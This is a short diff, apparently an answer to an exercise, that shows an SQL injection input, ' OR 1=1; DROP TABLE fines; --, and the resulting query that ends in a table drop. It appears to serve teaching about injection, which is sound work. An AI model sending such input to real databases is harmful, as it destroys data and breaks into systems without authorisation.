@@ -1,0 +1,8 @@
+1.
+
+' OR 1=1; DROP TABLE fines; --
+
+resulting query:
+SELECT * FROM mountain WHERE name LIKE '%' OR 1=1; DROP TABLE fines; --%';
+
+
